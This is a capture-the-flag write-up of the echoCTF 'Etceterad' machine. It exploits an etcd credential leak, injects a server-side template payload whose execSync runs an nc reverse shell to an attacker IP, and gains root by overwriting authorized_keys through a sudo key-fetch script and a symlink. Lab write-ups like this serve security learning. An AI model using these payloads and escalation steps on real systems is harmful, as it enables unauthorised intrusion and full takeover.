---
title: Etceterad @ echoCTF
author: McSam
date: 2024-12-27 08:33:00 +0800
categories: [CTF, echoCTF]
tags: [echoCTF, linux, etcd, web]
math: true
mermaid: true
media_subpath: /assests/posts/2024-12-26-etceterad
image:
  path: preview.png
---

## Etceterad - echoCTF

## Information Gathering And Enumeration
Let's us first start off by firing up `nmap` to discover open ports and running services on our target. <br>

```
mcsam@0x32:~/$ sudo nmap -vvv 10.0.160.122 -p- --min-rate 10000
Nmap scan report for 10.0.160.122
Host is up (0.27s latency).
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
2379/tcp open  etcd-client syn-ack ttl 63
```

From the above scan we see that there are three services running. Nmap gives us an idea of the services running and from that we can see that `etcd` is running on port `2379`. There's another service running on `1337` and after doing a service scan on it we realized it's a web application and hence can be accessed via the browser.<br>

```
mcsam@0x32:~/$ sudo nmap -sV 10.0.160.122 -p 1337
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-11 09:25 GMT
Nmap scan report for 10.0.160.122
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Node.js (Express middleware)
```
<br>
Accessing the website from via the browser.

![etceterad website](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/1337-website-etcd.png)


After a search for vulnerabilities associated with `etcd` running on `2379` we can find that this version of `etcd` is vulnerable to `CVE-2021-28235`.

PoC for this vulnerability can be found here: https://github.com/lucyxss/etcd-3.4.10-test/blob/master/temp4cj.png

Testing to see if our instance is also vulnerable.

![Vuln PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/debug_poc_2379.png)

## Exploitation
Using this vulnerability we are able to view leaked credentials for authenticating to `etcd`.

![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/leaked_creds_from_etctd_vuln.png)

To be able to hack `etcd` we must first understand what it is. `etcd` is a distributed key-value store used to store configuration data and coordinate distributed systems. Effectively, `etcd` acts as a database where clients can query data from the server in a distributed environment.
<br>
We can interract with `etcd` buy using the client software called `etcdctl`.
First of all we will have to install the tool if it's not available on current attack machine.
<br>
After installing it we can now interact with the `etcd`.
We first send a query to get information about out current user.

```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 user get nodejs
User: nodejs
Roles: etsctf
```

From the above query we can see that we have the role `etsctf`. Now we try to see what permissions are available for this role and what we can achieve with it.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 role get etsctf

Role etsctf
KV Read:
	[/home/, /home0) (prefix /home/)
	[/nodejs/, /nodejs0) (prefix /nodejs/)
	ETSCTF
KV Write:
	[/home/, /home0) (prefix /home/)
	[/nodejs/, /nodejs0) (prefix /nodejs/)
```

From the above results users with the role `etsctf` can read and write to the `/home` and `/nodejs` prefixes.

We will attempt to view the keys under the `/nodejs` prefix.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/" --keys-only
/nodejs/index
```

Viewing the value stored in the `/nodejs/index` key.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/index"

/nodejs/index
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title><% if (typeof title == "undefined") { %>
      EtceteraD
      <% } else { %>
      <%= title %>
      <% }%></title>
      ...
      </body>
</html>
```

From the content of the `/nodejs/index` key we observe and find out that it is the source code for the web site we saw earlier running on port `1337`. Furthermore, we can also see that the source code does some server side rendering and hence may be vulnerable to SSTI. From our initial Nmap scan, nmap reported that the service running on port `1337` was powered by Node.js (Express middleware). This can guide us to know the kind of code to execute inorder to obtain RCE.

### Testing our theory.
Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "Bingo: <%= 7*7 %>" 
OK
```
We reload the web app on port `1337` and bingo!!! <br>
![SSTI PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)

After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target. <br>
Payload:`<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`

We will further leverage this to obtain a revervseshell using the payload above.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>"
OK
```

We can now start our listener and reload the webpage to get a connection.
```
mcsam@0x32:~/$ rlwrap nc -lnvp 8989
Listening on 0.0.0.0 8989
Connection received on 10.0.160.122 40418
python3 -c "import pty;pty.spawn('/bin/bash')"
nodejs@etceterad:/app$ id
uid=1001(nodejs) gid=1001(nodejs) groups=1001(nodejs)
nodejs@etceterad:/app$ 
```

## Privilege Escalation
First thing we can do is to check our `sudo` privileges on the machine.
```
mcsam@0x32:~/$ sudo -l
Matching Defaults entries for nodejs on etceterad:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nodejs may run the following commands on etceterad:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/fetch_keys
```

We can see that we are allowed to run `/usr/local/sbin/fetch_keys` as any user on the machine. We will have to leverage this to hijack the process and obtain code execution as the root user.

Unfortunately we have very limited permissions to `/usr/local/sbin/fetch_keys` and hence we cannot read the contents of the file.

We will leverage another teachnique to determine what happens when the script is run. We will do that using `pspy`.

Note that `pspy` does not come by default in linux and as a result we will have to download and transfer the binary to our target.

To be able to do this efficiently we would need another session(reverse shell) on the target. We can monitor the activity with one shell while running the script from another shell to give us full visibility.

Running the script `/usr/local/sbin/fetch_keys`.
```
mcsam@0x32:~/$ sudo /usr/local/sbin/fetch_keys
Fetching /home/ETSCTF/.ssh/authorized_keys
Fixing perms (0400)
```

Viewing events from `pspy`.
![pspy output](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/inspecting_ps_for_fetch_keys.png)

From the image above, we can see that the `/usr/local/sbin/fetch_keys` script queries a key from `etcd` and writes the value to `/home/ETSCTF/.ssh/authorized_keys`.

Previously, we found out that we have write access to a number of keys under the `/home` prefix. We can enumerate and check the keys we can write to. If we can successfully write our own public keys to that to the `etcd` databasee, we can run the `/usr/local/sbin/fetch_keys` script to write our ssh public key to `/home/ETSCTF/.ssh/authorized_keys`. If this is successful then we would be able to login into the machine as `ETSCTF`.

Checking the keys under the `/home` prefix.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/home/" --keys-only
/home/ETSCTF/.ssh/authorized_keys
```

It is now evident that we have write access to that key.

We have to first start off by generating our ssh public keys.
```
mcsam@0x32:~/$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mcsam/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mcsam/.ssh/id_rsa
Your public key has been saved in /home/mcsam/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:edHyAMJkJm5XAUbl/7lEzMMvHnaMrTtrD8Gr54vyoY8 mcsam@0x32
The key's randomart image is:
+---[RSA 3072]----+
|    .+Oo=.       |
|   . =.+ . .     |
|    o . . + .    |
|   . .   o X     |
|        S o X    |
|         . o X   |
|          . @ =  |
|        .o B+B   |
|        E+=+O*.  |
+----[SHA256]-----+
```

Now we will write the public keys to the `/home/ETSCTF/.ssh/authorized_keys` key.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/home/ETSCTF/.ssh/authorized_keys" < id_rsa.pub
OK
```

After doing this we can run  the `/usr/local/sbin/fetch_keys` script and then login into the machine using our private key.
```
mcsam@0x32:~/$ ssh -i id_rsa ETSCTF@10.0.160.122
Linux etceterad.echocity-f.com 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ETSCTF@etceterad:~$ id
uid=1000(ETSCTF) gid=1000(ETSCTF) groups=1000(ETSCTF)
```

We can do a little experiment to see what's goin on here. Since we now have access as the `ETSCTF` user, we can delete the file and re-run the `/usr/local/sbin/fetch_keys` script.

```
ETSCTF@etceterad:~/.ssh$ rm authorized_keys 
rm: remove write-protected regular file 'authorized_keys'? y
ETSCTF@etceterad:~/.ssh$ ls -la
total 20
drwxr-xr-x 1 ETSCTF ETSCTF 4096 Oct 11 12:00 .
drwxr-xr-x 1 ETSCTF ETSCTF 4096 Mar 26  2024 ..
-r-------- 1 root   root    565 Oct 11 12:00 authorized_keys
```

We observe that a new file is written to disk as the root user. After thinking and experimenting about this for some time we realize that any file with the name `authorized_keys` in the `/home/ETSCTF/.ssh/` is overwritten by the root user when `/usr/local/sbin/fetch_keys` is run.

We can leverage this by using a symlink which points to the `authorized_keys` file under the `/root/.ssh/` directory to overwrite the root user's ssh public keys. After doing that we can ssh into the machine using our private key as the root user.
```
ETSCTF@etceterad:~/.ssh$ rm authorized_keys 
rm: remove write-protected regular file 'authorized_keys'? y
ETSCTF@etceterad:~/.ssh$ ln -s /root/.ssh/authorized_keys authorized_keys
ETSCTF@etceterad:~/.ssh$ ls -la
total 16
drwxr-xr-x 1 ETSCTF ETSCTF 4096 Oct 11 12:06 .
drwxr-xr-x 1 ETSCTF ETSCTF 4096 Mar 26  2024 ..
lrwxrwxrwx 1 ETSCTF ETSCTF   26 Oct 11 12:06 authorized_keys -> /root/.ssh/authorized_keys
```

After this we run the `/usr/local/sbin/fetch_keys` script and `/root/.ssh/authorized_keys` gets overwritten with our public ssh key.

We can now login to the box as the root user.
Voila :smiley: :sparkles:.
```
mcsam@0x32:~/$ ssh -i id_rsa root@10.0.160.122
Linux etceterad.echocity-f.com 4.19.0-25-amd64 #1 SMP Debian 4.19.289-2 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@etceterad:~# id
uid=0(root) gid=0(root) groups=0(root)
root@etceterad:~#
```